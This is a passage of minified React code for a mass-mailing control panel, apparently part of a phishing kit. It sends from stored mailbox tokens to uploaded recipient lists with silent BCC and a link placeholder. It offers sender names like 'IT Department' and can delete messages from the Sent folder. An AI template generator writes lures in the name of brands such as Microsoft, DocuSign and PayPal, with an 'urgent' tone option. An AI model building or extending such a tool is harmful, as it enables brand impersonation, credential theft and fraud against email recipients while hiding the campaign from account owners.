        className: `lg:col-span-2 space-y-4`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsx)(`label`, {
                className: `block text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
                children: `Send From`,
              }),
              (0, R.jsx)(Ws, { tokens: e, selected: n, onSelect: r }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between mb-2`,
                children: [
                  (0, R.jsx)(`label`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                    children: `Recipients`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-2`,
                    children: [
                      (0, R.jsxs)(`button`, {
                        onClick: () => se.current?.click(),
                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider text-text-muted hover:text-slate-900 border border-border hover:border-border-light transition-colors cursor-pointer`,
                        children: [(0, R.jsx)(Li, { size: 10 }), `Upload .txt`],
                      }),
                      (0, R.jsx)(`input`, {
                        ref: se,
                        type: `file`,
                        accept: `.txt,.csv`,
                        onChange: de,
                        className: `hidden`,
                      }),
                      (0, R.jsxs)(`span`, {
                        className: `text-[10px] text-text-muted`,
                        children: [
                          N.length,
                          ` valid email`,
                          N.length === 1 ? `` : `s`,
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsx)(`textarea`, {
                value: i,
                onChange: (e) => a(e.target.value),
                placeholder: `Enter email addresses, one per line or comma-separated — or upload a .txt file`,
                rows: 5,
                className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm font-mono focus:outline-none focus:border-border-light resize-y`,
              }),
              y
                ? (0, R.jsxs)(`div`, {
                    className: `mt-3 border border-blue-500/30 bg-blue-500/5 p-3`,
                    children: [
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center justify-between mb-2`,
                        children: [
                          (0, R.jsxs)(`label`, {
                            className: `flex items-center gap-2 text-xs font-bold text-blue-400 uppercase tracking-wider`,
                            children: [
                              (0, R.jsx)(qr, { size: 12 }),
                              `BCC Recipients`,
                            ],
                          }),
                          (0, R.jsxs)(`div`, {
                            className: `flex items-center gap-3`,
                            children: [
                              ue.length > 0 &&
                                (0, R.jsxs)(`span`, {
                                  className: `text-[10px] text-blue-300 font-medium`,
                                  children: [
                                    ue.length,
                                    ` address`,
                                    ue.length === 1 ? `` : `es`,
                                  ],
                                }),
                              (0, R.jsxs)(`button`, {
                                onClick: () => {
                                  (v(``), b(!1));
                                },
                                className: `text-xs text-red-400 hover:text-red-300 cursor-pointer flex items-center gap-1`,
                                children: [
                                  (0, R.jsx)(Ki, { size: 12 }),
                                  ` Remove`,
                                ],
                              }),
                            ],
                          }),
                        ],
                      }),
                      (0, R.jsx)(`textarea`, {
                        value: g,
                        onChange: (e) => v(e.target.value),
                        placeholder: `BCC addresses — one per line or comma-separated (hidden from TO recipients)`,
                        rows: 3,
                        className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm font-mono focus:outline-none focus:border-blue-500/50 resize-y`,
                      }),
                      (0, R.jsx)(`p`, {
                        className: `text-[10px] text-text-muted mt-1`,
                        children: `Each email sent to a TO recipient will also be silently copied to all BCC addresses.`,
                      }),
                    ],
                  })
                : (0, R.jsxs)(`button`, {
                    onClick: () => b(!0),
                    className: `mt-3 flex items-center gap-2 px-3 py-2 text-xs font-semibold text-blue-400 border border-blue-500/30 bg-blue-500/5 hover:bg-blue-500/15 hover:text-blue-300 transition-all cursor-pointer w-full justify-center`,
                    children: [
                      (0, R.jsx)(qr, { size: 14 }),
                      `Add BCC (Blind Carbon Copy)`,
                    ],
                  }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4 space-y-3`,
            children: [
              (0, R.jsx)(`label`, {
                className: `block text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                children: `Personalization`,
              }),
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`label`, {
                    className: `block text-[10px] text-text-muted mb-1`,
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1`,
                      children: [
                        (0, R.jsx)(oi, {
                          size: 10,
                          className: `text-blue-400`,
                        }),
                        `Your Link `,
                        (0, R.jsx)(`span`, {
                          className: `opacity-50`,
                          children: `→ replaces [[link]]`,
                        }),
                      ],
                    }),
                  }),
                  (0, R.jsx)(`input`, {
                    type: `url`,
                    value: E,
                    onChange: (e) => D(e.target.value),
                    placeholder: `https://your-link.com/l/xxxxx`,
                    className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsxs)(`label`, {
                    className: `block text-[10px] text-text-muted mb-1`,
                    children: [
                      `Sender Name `,
                      (0, R.jsxs)(`span`, {
                        className: `opacity-50`,
                        children: [`→ replaces `, `{{sender_name}}`],
                      }),
                    ],
                  }),
                  (0, R.jsx)(`input`, {
                    type: `text`,
                    value: te,
                    onChange: (e) => ne(e.target.value),
                    placeholder: `e.g. John Smith, IT Department, HR Team`,
                    className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between mb-2`,
                children: [
                  (0, R.jsx)(`label`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1`,
                      children: [
                        (0, R.jsx)(Zr, {
                          size: 10,
                          className: `text-emerald-400`,
                        }),
                        `Email Template`,
                      ],
                    }),
                  }),
                  (0, R.jsx)(V, {
                    variant: `ghost`,
                    size: `sm`,
                    onClick: () => w(!0),
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1`,
                      children: [(0, R.jsx)(Ai, { size: 11 }), ` AI Generate`],
                    }),
                  }),
                ],
              }),
              (0, R.jsxs)(`select`, {
                value: O,
                onChange: (e) => _e(e.target.value),
                className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light cursor-pointer mb-3`,
                children: [
                  (0, R.jsx)(`option`, {
                    value: ``,
                    children: `— Select a template (or write custom below) —`,
                  }),
                  Ls.map((e) =>
                    (0, R.jsx)(
                      `option`,
                      { value: e.id, children: e.name },
                      e.id,
                    ),
                  ),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsx)(`div`, {
                className: `flex items-center justify-between mb-2`,
                children: (0, R.jsx)(`label`, {
                  className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                  children: `Subject`,
                }),
              }),
              (0, R.jsx)(`input`, {
                type: `text`,
                value: o,
                onChange: (e) => s(e.target.value),
                placeholder: `Email subject line`,
                className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between mb-2`,
                children: [
                  (0, R.jsx)(`label`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                    children: `Email Body`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-1`,
                    children: [
                      (0, R.jsxs)(`button`, {
                        onClick: () => {
                          (k === `visual` && fe(),
                            ie(k === `visual` ? `html` : `visual`));
                        },
                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider border transition-colors cursor-pointer ${k === `html` ? `text-blue-400 border-blue-400/40 bg-blue-400/10` : `text-text-muted border-border hover:border-border-light`}`,
                        children: [
                          (0, R.jsx)(Vr, { size: 10 }),
                          k === `html` ? `HTML` : `Visual`,
                        ],
                      }),
                      (0, R.jsx)(V, {
                        variant: `ghost`,
                        size: `sm`,
                        onClick: () => T(!0),
                        children: (0, R.jsxs)(`span`, {
                          className: `flex items-center gap-1`,
                          children: [(0, R.jsx)(Jr, { size: 11 }), ` Preview`],
                        }),
                      }),
                    ],
                  }),
                ],
              }),
              k === `visual`
                ? (0, R.jsx)(`iframe`, {
                    ref: le,
                    className: `w-full bg-white border border-border min-h-[300px] resize-y`,
                    style: { height: 300 },
                    onLoad: () => pe(c),
                  })
                : (0, R.jsx)(`textarea`, {
                    value: c,
                    onChange: (e) => l(e.target.value),
                    placeholder: `<html>...</html> or plain text`,
                    rows: 12,
                    className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm font-mono focus:outline-none focus:border-border-light resize-y`,
                  }),
              (0, R.jsxs)(`div`, {
                className: `mt-3 border border-border bg-bg/50 p-3`,
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
                    children: `Auto-Grab Variables`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex flex-wrap gap-2 text-[11px]`,
                    children: [
                      (0, R.jsx)(Ys, {
                        v: `[[name]]`,
                        desc: `Recipient name`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[email]]`,
                        desc: `Email address`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[company]]`,
                        desc: `Company`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[date]]`,
                        desc: `Date`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[name_initial]]`,
                        desc: `Initial`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[sender_email]]`,
                        desc: `Sender email`,
                        color: `emerald`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `[[link]]`,
                        desc: `Your link`,
                        color: `blue`,
                      }),
                      (0, R.jsx)(Ys, {
                        v: `{{sender_name}}`,
                        desc: `Sender name`,
                        color: `blue`,
                      }),
                    ],
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsx)(`div`, {
                className: `flex items-center justify-between mb-3`,
                children: (0, R.jsx)(`label`, {
                  className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                  children: (0, R.jsxs)(`span`, {
                    className: `flex items-center gap-1`,
                    children: [(0, R.jsx)(mi, { size: 10 }), `Attachments`],
                  }),
                }),
              }),
              (0, R.jsxs)(`div`, {
                className: `flex gap-2 mb-3`,
                children: [
                  (0, R.jsxs)(`button`, {
                    onClick: () => ce.current?.click(),
                    className: `flex items-center gap-1.5 px-3 py-2 text-xs font-semibold text-text-secondary hover:text-slate-900 border border-border hover:border-border-light bg-bg transition-colors cursor-pointer`,
                    children: [(0, R.jsx)(Li, { size: 13 }), ` Add File`],
                  }),
                  (0, R.jsxs)(`button`, {
                    onClick: ge,
                    disabled: j || !c.trim(),
                    className: `flex items-center gap-1.5 px-3 py-2 text-xs font-semibold text-blue-400 hover:text-blue-300 border border-blue-400/30 hover:border-blue-400/60 bg-blue-400/5 transition-colors cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed`,
                    children: [
                      j
                        ? (0, R.jsx)(ci, {
                            size: 13,
                            className: `animate-spin`,
                          })
                        : (0, R.jsx)(Xr, { size: 13 }),
                      `Convert Body to PDF`,
                    ],
                  }),
                  (0, R.jsx)(`input`, {
                    ref: ce,
                    type: `file`,
                    multiple: !0,
                    onChange: me,
                    className: `hidden`,
                  }),
                ],
              }),
              ae.length === 0
                ? (0, R.jsxs)(`div`, {
                    onClick: () => ce.current?.click(),
                    onDragOver: (e) => {
                      (e.preventDefault(),
                        e.currentTarget.classList.add(`border-blue-400`));
                    },
                    onDragLeave: (e) =>
                      e.currentTarget.classList.remove(`border-blue-400`),
                    onDrop: (e) => {
                      (e.preventDefault(),
                        e.currentTarget.classList.remove(`border-blue-400`));
                      let t = e.dataTransfer;
                      if (t?.files) {
                        let e = ce.current;
                        if (e) {
                          let n = new DataTransfer();
                          (Array.from(t.files).forEach((e) => n.items.add(e)),
                            (e.files = n.files),
                            e.dispatchEvent(
                              new Event(`change`, { bubbles: !0 }),
                            ));
                        }
                      }
                    },
                    className: `border-2 border-dashed border-border hover:border-border-light rounded py-5 flex flex-col items-center gap-1 text-text-muted cursor-pointer transition-colors`,
                    children: [
                      (0, R.jsx)(mi, { size: 20, className: `opacity-30` }),
                      (0, R.jsx)(`span`, {
                        className: `text-xs`,
                        children: `Drop files here or click to attach`,
                      }),
                      (0, R.jsx)(`span`, {
                        className: `text-[10px] opacity-50`,
                        children: `Max 35MB total`,
                      }),
                    ],
                  })
                : (0, R.jsxs)(`div`, {
                    className: `space-y-1`,
                    children: [
                      ae.map((e, t) =>
                        (0, R.jsxs)(
                          `div`,
                          {
                            className: `flex items-center gap-2 bg-bg border border-border px-3 py-2 text-xs`,
                            children: [
                              (0, R.jsx)(Zr, {
                                size: 14,
                                className: `text-blue-400 shrink-0`,
                              }),
                              (0, R.jsx)(`span`, {
                                className: `truncate flex-1 text-text-secondary`,
                                children: e.name,
                              }),
                              (0, R.jsxs)(`span`, {
                                className: `text-text-muted shrink-0`,
                                children: [(e.size / 1024).toFixed(0), ` KB`],
                              }),
                              (0, R.jsx)(`button`, {
                                onClick: () => he(t),
                                className: `p-1 text-text-muted hover:text-danger transition-colors cursor-pointer`,
                                children: (0, R.jsx)(Ki, { size: 14 }),
                              }),
                            ],
                          },
                          t,
                        ),
                      ),
                      (0, R.jsx)(`div`, {
                        className: `flex items-center gap-2 mt-1`,
                        children: (0, R.jsxs)(`span`, {
                          className: `text-[10px] text-text-muted`,
                          children: [
                            ae.length,
                            ` file`,
                            ae.length === 1 ? `` : `s`,
                            ` (`,
                            (ae.reduce((e, t) => e + t.size, 0) / 1024).toFixed(
                              0,
                            ),
                            ` KB)`,
                          ],
                        }),
                      }),
                    ],
                  }),
            ],
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `space-y-4`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4 space-y-3`,
            children: [
              (0, R.jsx)(`h3`, {
                className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                children: `Send Options`,
              }),
              (0, R.jsx)(H, {
                label: `Delay (seconds)`,
                type: `number`,
                value: String(u),
                onChange: (e) =>
                  d(Math.max(1, Math.min(60, Number(e.target.value)))),
              }),
              (0, R.jsxs)(xa, {
                label: `Importance`,
                value: f,
                onChange: (e) => p(e.target.value),
                children: [
                  (0, R.jsx)(`option`, { value: `low`, children: `Low` }),
                  (0, R.jsx)(`option`, { value: `normal`, children: `Normal` }),
                  (0, R.jsx)(`option`, { value: `high`, children: `High` }),
                ],
              }),
              (0, R.jsxs)(`label`, {
                className: `flex items-center gap-2 cursor-pointer`,
                children: [
                  (0, R.jsx)(`input`, {
                    type: `checkbox`,
                    checked: m,
                    onChange: (e) => h(e.target.checked),
                    className: `accent-white`,
                  }),
                  (0, R.jsx)(`span`, {
                    className: `text-xs text-text-secondary`,
                    children: `Delete from Sent folder after sending`,
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4`,
            children: [
              (0, R.jsx)(`h3`, {
                className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3`,
                children: `Summary`,
              }),
              (0, R.jsxs)(`div`, {
                className: `space-y-2 text-xs`,
                children: [
                  (0, R.jsx)(qs, {
                    label: `From`,
                    value: e.find((e) => e.id === n)?.user_email ?? `—`,
                  }),
                  (0, R.jsx)(qs, { label: `Recipients`, value: `${N.length}` }),
                  ue.length > 0 &&
                    (0, R.jsx)(qs, { label: `BCC`, value: `${ue.length}` }),
                  (0, R.jsx)(qs, {
                    label: `Delay`,
                    value: `${u}s between emails`,
                  }),
                  (0, R.jsx)(qs, {
                    label: `Est. Time`,
                    value:
                      N.length > 0
                        ? `~${Math.ceil((N.length * (u + 0.5)) / 60)} min`
                        : `—`,
                  }),
                  E &&
                    (0, R.jsx)(qs, {
                      label: `Link`,
                      value: E.length > 30 ? E.slice(0, 30) + `...` : E,
                    }),
                  O &&
                    (0, R.jsx)(qs, {
                      label: `Template`,
                      value: Ls.find((e) => e.id === O)?.name ?? `Custom`,
                    }),
                  ae.length > 0 &&
                    (0, R.jsx)(qs, {
                      label: `Attachments`,
                      value: `${ae.length} file${ae.length === 1 ? `` : `s`}`,
                    }),
                ],
              }),
            ],
          }),
          (0, R.jsx)(V, {
            onClick: ye,
            disabled: x || !n || N.length === 0,
            className: `w-full`,
            children: (0, R.jsxs)(`span`, {
              className: `flex items-center justify-center gap-2`,
              children: [
                x
                  ? (0, R.jsx)(ci, { size: 14, className: `animate-spin` })
                  : (0, R.jsx)(Si, { size: 14 }),
                x ? `Creating Job...` : `Send to ${N.length} Recipients`,
              ],
            }),
          }),
        ],
      }),
      C &&
        (0, R.jsx)(Vs, {
          onClose: () => w(!1),
          onApply: (e, t) => {
            (s(e),
              l(t),
              re(``),
              k === `visual` && setTimeout(() => pe(t), 60),
              w(!1));
          },
        }),
      ee &&
        (0, R.jsx)(Hs, {
          html: ve(c, N[0] || `john.smith@example.com`),
          subject: ve(o, N[0] || `john.smith@example.com`),
          onClose: () => T(!1),
        }),
    ],
  });
}
function Bs() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(null),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)({}),
    u = (0, _.useRef)(null),
    d = (0, _.useRef)(null),
    f = (0, _.useRef)(null),
    p = z((e) => e.add),
    m = (0, _.useCallback)(() => {
      Os()
        .then(t)
        .catch(() => p(`Failed to load jobs`, `error`))
        .finally(() => r(!1));
    }, []),
    h = e.some((e) => e.status === `running` || e.status === `queued`);
  ((0, _.useEffect)(
    () => (
      m(),
      (u.current = setInterval(m, h ? 2e3 : 1e4)),
      () => {
        u.current && clearInterval(u.current);
      }
    ),
    [m, h],
  ),
    (0, _.useEffect)(() => {
      if (o) {
        let e = () => {
          Ps(o)
            .then((e) => l((t) => ({ ...t, [o]: e })))
            .catch(() => {});
        };
        return (
          e(),
          (d.current = setInterval(e, 1500)),
          () => {
            d.current && clearInterval(d.current);
          }
        );
      }
      return () => {
        d.current && clearInterval(d.current);
      };
    }, [o]),
    (0, _.useEffect)(() => {
      o && f.current && f.current.scrollIntoView({ behavior: `smooth` });
    }, [c, o]));
  async function g(e) {
    try {
      (await As(e), p(`Job cancelled`, `success`), m());
    } catch (e) {
      p(e.message || `Failed to cancel`, `error`);
    }
  }
  async function v(e) {
    try {
      (await js(e), p(`Job deleted`, `success`), m());
    } catch (e) {
      p(e.message || `Failed to delete`, `error`);
    }
  }
  async function y(e) {
    try {
      (await Ms(e), p(`Job paused`, `success`), m());
    } catch (e) {
      p(e.message || `Failed to pause`, `error`);
    }
  }
  async function b(e) {
    try {
      (await Ns(e), p(`Job resumed`, `success`), m());
    } catch (e) {
      p(e.message || `Failed to resume`, `error`);
    }
  }
  async function x(e) {
    try {
      a(await ks(e));
    } catch {
      p(`Failed to load job details`, `error`);
    }
  }
  return n
    ? (0, R.jsxs)(`div`, {
        className: `flex items-center justify-center py-16 gap-2 text-text-muted`,
        children: [
          (0, R.jsx)(ci, { size: 14, className: `animate-spin` }),
          (0, R.jsx)(`span`, {
            className: `text-sm`,
            children: `Loading jobs...`,
          }),
        ],
      })
    : (0, R.jsxs)(`div`, {
        children: [
          e.length === 0
            ? (0, R.jsxs)(`div`, {
                className: `flex flex-col items-center justify-center py-16 text-text-muted`,
                children: [
                  (0, R.jsx)(Si, { size: 32, className: `mb-3 opacity-30` }),
                  (0, R.jsx)(`p`, {
                    className: `text-sm`,
                    children: `No send jobs yet. Create one from the Compose tab.`,
                  }),
                ],
              })
            : (0, R.jsx)(`div`, {
                className: `space-y-0`,
                children: e.map((e) => {
                  let t = o === e.job_id,
                    n = c[e.job_id],
                    r = e.status === `running` || e.status === `queued`,
                    i = e.sent === 0 && e.failed > 0,
                    a =
                      e.status === `failed` ||
                      e.status === `completed_with_errors`;
                  return (0, R.jsxs)(
                    `div`,
                    {
                      className: `border border-border mb-[-1px]`,
                      children: [
                        (0, R.jsxs)(`div`, {
                          className: `flex items-center gap-0 hover:bg-surface-hover transition-colors`,
                          children: [
                            (0, R.jsxs)(`button`, {
                              onClick: () => s(t ? null : e.job_id),
                              className: `flex-1 flex items-center gap-3 px-3 py-2.5 text-left cursor-pointer`,
                              children: [
                                (0, R.jsxs)(`span`, {
                                  className: `text-xs font-mono text-text-muted w-12`,
                                  children: [`#`, e.job_id],
                                }),
                                (0, R.jsx)(Ks, { status: e.status }),
                                (0, R.jsxs)(`div`, {
                                  className: `flex items-center gap-2 flex-1 min-w-0`,
                                  children: [
                                    (0, R.jsx)(`div`, {
                                      className: `w-24 h-1.5 bg-bg rounded-full overflow-hidden shrink-0`,
                                      children: (0, R.jsx)(`div`, {
                                        className: `h-full rounded-full transition-all ${e.status === `completed` ? `bg-active` : a ? `bg-danger` : `bg-white`}`,
                                        style: { width: `${e.progress_pct}%` },
                                      }),
                                    }),
                                    (0, R.jsxs)(`span`, {
                                      className: `text-[11px] text-text-secondary whitespace-nowrap`,
                                      children: [
                                        e.sent,
                                        `/`,
                                        e.total,
                                        e.failed > 0 &&
                                          (0, R.jsxs)(`span`, {
                                            className: `text-danger ml-1`,
                                            children: [`(`, e.failed, ` err)`],
                                          }),
                                      ],
                                    }),
                                    r &&
                                      n?.status &&
                                      (0, R.jsx)(`span`, {
                                        className: `text-[10px] text-emerald-400 truncate font-mono`,
                                        children: n.status.sending_to,
                                      }),
                                  ],
                                }),
                                (0, R.jsxs)(`span`, {
                                  className: `text-[10px] text-text-muted`,
                                  children: [e.delay, `s`],
                                }),
                                (0, R.jsx)(Mr, {
                                  size: 12,
                                  className: `text-text-muted transition-transform shrink-0 ${t ? `rotate-180` : ``}`,
                                }),
                              ],
                            }),
                            (0, R.jsxs)(`div`, {
                              className: `flex gap-0.5 pr-2`,
                              children: [
                                (0, R.jsx)(`button`, {
                                  onClick: () => x(e.job_id),
                                  className: `p-1.5 text-text-muted hover:text-slate-900 transition-colors cursor-pointer`,
                                  title: `Details`,
                                  children: (0, R.jsx)(Jr, { size: 12 }),
                                }),
                                e.status === `running` &&
                                  (0, R.jsx)(`button`, {
                                    onClick: () => y(e.job_id),
                                    className: `p-1.5 text-amber-400 hover:text-amber-300 transition-colors cursor-pointer`,
                                    title: `Pause`,
                                    children: (0, R.jsx)(hi, { size: 12 }),
                                  }),
                                e.status === `paused` &&
                                  (0, R.jsx)(`button`, {
                                    onClick: () => b(e.job_id),
                                    className: `p-1.5 text-emerald-400 hover:text-emerald-300 transition-colors cursor-pointer`,
                                    title: `Resume`,
                                    children: (0, R.jsx)(gi, { size: 12 }),
                                  }),
                                r || e.status === `paused`
                                  ? (0, R.jsx)(`button`, {
                                      onClick: () => g(e.job_id),
                                      className: `p-1.5 text-text-muted hover:text-danger transition-colors cursor-pointer`,
                                      title: `Cancel`,
                                      children: (0, R.jsx)(Rr, { size: 12 }),
                                    })
                                  : (0, R.jsx)(`button`, {
                                      onClick: () => v(e.job_id),
                                      className: `p-1.5 text-text-muted hover:text-danger transition-colors cursor-pointer`,
                                      title: `Delete`,
                                      children: (0, R.jsx)(I, { size: 12 }),
                                    }),
                              ],
                            }),
                          ],
                        }),
                        a &&
                          i &&
                          (() => {
                            let e =
                              n?.log
                                ?.filter((e) => e.l === `error`)
                                .slice(-1)[0]?.m ||
                              `All send attempts failed — expand job for details.`;
                            return (0, R.jsxs)(`div`, {
                              className: `px-3 py-2 bg-red-950/40 border-t border-red-500/20 flex items-center gap-2`,
                              children: [
                                (0, R.jsx)(L, {
                                  size: 12,
                                  className: `text-red-400 shrink-0`,
                                }),
                                (0, R.jsx)(`span`, {
                                  className: `text-[11px] text-red-300 truncate`,
                                  children: e,
                                }),
                              ],
                            });
                          })(),
                        t &&
                          (0, R.jsxs)(`div`, {
                            className: `border-t border-border bg-bg/50`,
                            children: [
                              n?.status &&
                                (0, R.jsxs)(`div`, {
                                  className: `flex gap-4 px-3 py-2 border-b border-border/50 text-[10px] uppercase tracking-wider`,
                                  children: [
                                    (0, R.jsxs)(`span`, {
                                      className: `text-text-muted`,
                                      children: [
                                        `Sender: `,
                                        (0, R.jsx)(`span`, {
                                          className: `text-text-secondary font-mono normal-case`,
                                          children: n.status.sender,
                                        }),
                                      ],
                                    }),
                                    (0, R.jsxs)(`span`, {
                                      className: `text-text-muted`,
                                      children: [
                                        `Speed: `,
                                        (0, R.jsxs)(`span`, {
                                          className: `text-emerald-400`,
                                          children: [n.status.speed, `/min`],
                                        }),
                                      ],
                                    }),
                                    (0, R.jsxs)(`span`, {
                                      className: `text-text-muted`,
                                      children: [
                                        `Position: `,
                                        (0, R.jsxs)(`span`, {
                                          className: `text-text-secondary`,
                                          children: [
                                            n.status.idx,
                                            `/`,
                                            n.status.total,
                                          ],
                                        }),
                                      ],
                                    }),
                                  ],
                                }),
                              (0, R.jsxs)(`div`, {
                                className: `max-h-52 overflow-y-auto font-mono text-[11px] leading-relaxed p-2 space-y-0.5`,
                                children: [
                                  (!n?.log || n.log.length === 0) &&
                                    (0, R.jsx)(`div`, {
                                      className: `text-text-muted text-center py-4`,
                                      children: r
                                        ? `Waiting for activity...`
                                        : `No live data available`,
                                    }),
                                  n?.log.map((e, t) =>
                                    (0, R.jsxs)(
                                      `div`,
                                      {
                                        className: `flex gap-2 ${e.l === `error` ? `text-red-400` : e.l === `warn` ? `text-amber-400` : e.m.includes(`✓`) ? `text-emerald-400` : `text-text-muted`}`,
                                        children: [
                                          (0, R.jsx)(`span`, {
                                            className: `text-text-muted/50 shrink-0`,
                                            children: e.t,
                                          }),
                                          (0, R.jsx)(`span`, {
                                            className: `break-all`,
                                            children: e.m,
                                          }),
                                        ],
                                      },
                                      t,
                                    ),
                                  ),
                                  (0, R.jsx)(`div`, { ref: f }),
                                ],
                              }),
                            ],
                          }),
                      ],
                    },
                    e.job_id,
                  );
                }),
              }),
          i && (0, R.jsx)(Us, { job: i, onClose: () => a(null) }),
        ],
      });
}
function Vs({ onClose: e, onApply: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(`professional`),
    [c, l] = (0, _.useState)(!1),
    [u, d] = (0, _.useState)(null),
    f = z((e) => e.add);
  async function p() {
    if (!n && !i) {
      f(`Enter a brand or scenario`, `error`);
      return;
    }
    l(!0);
    try {
      d(await Fs({ brand: n, scenario: i, tone: o }));
    } catch (e) {
      f(e.message || `AI generation failed`, `error`);
    } finally {
      l(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `AI Template Generator`,
    onClose: e,
    width: `max-w-2xl`,
    children: (0, R.jsx)(`div`, {
      className: `space-y-4`,
      children: u
        ? (0, R.jsxs)(R.Fragment, {
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                    children: `Subject`,
                  }),
                  (0, R.jsx)(`div`, {
                    className: `bg-bg border border-border px-3 py-2 text-sm`,
                    children: u.subject,
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                    children: `Preview`,
                  }),
                  (0, R.jsx)(`div`, {
                    className: `bg-white text-black p-4 border border-border max-h-64 overflow-auto text-sm`,
                    dangerouslySetInnerHTML: { __html: u.body },
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `flex gap-2`,
                children: [
                  (0, R.jsx)(V, {
                    onClick: () => t(u.subject, u.body),
                    children: `Use This Template`,
                  }),
                  (0, R.jsx)(V, {
                    variant: `secondary`,
                    onClick: () => {
                      d(null);
                    },
                    children: `Generate Again`,
                  }),
                  (0, R.jsx)(V, {
                    variant: `ghost`,
                    onClick: e,
                    children: `Cancel`,
                  }),
                ],
              }),
            ],
          })
        : (0, R.jsxs)(R.Fragment, {
            children: [
              (0, R.jsx)(H, {
                label: `Brand / Service`,
                value: n,
                onChange: (e) => r(e.target.value),
                placeholder: `e.g. Microsoft, DocuSign, PayPal`,
              }),
              (0, R.jsx)(H, {
                label: `Scenario`,
                value: i,
                onChange: (e) => a(e.target.value),
                placeholder: `e.g. Invoice payment required, Document signature needed`,
              }),
              (0, R.jsxs)(xa, {
                label: `Tone`,
                value: o,
                onChange: (e) => s(e.target.value),
                children: [
                  (0, R.jsx)(`option`, {
                    value: `professional`,
                    children: `Professional`,
                  }),
                  (0, R.jsx)(`option`, { value: `urgent`, children: `Urgent` }),
                  (0, R.jsx)(`option`, {
                    value: `friendly`,
                    children: `Friendly`,
                  }),
                  (0, R.jsx)(`option`, { value: `formal`, children: `Formal` }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `flex gap-2`,
                children: [
                  (0, R.jsx)(V, {
                    onClick: p,
                    disabled: c,
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1.5`,
                      children: [
                        c
                          ? (0, R.jsx)(ci, {
                              size: 12,
                              className: `animate-spin`,
                            })
                          : (0, R.jsx)(Ai, { size: 12 }),
                        c ? `Generating...` : `Generate Template`,
                      ],
                    }),
                  }),
                  (0, R.jsx)(V, {
                    variant: `ghost`,
                    onClick: e,
                    children: `Cancel`,
                  }),
                ],
              }),
            ],
          }),
    }),
  });
}
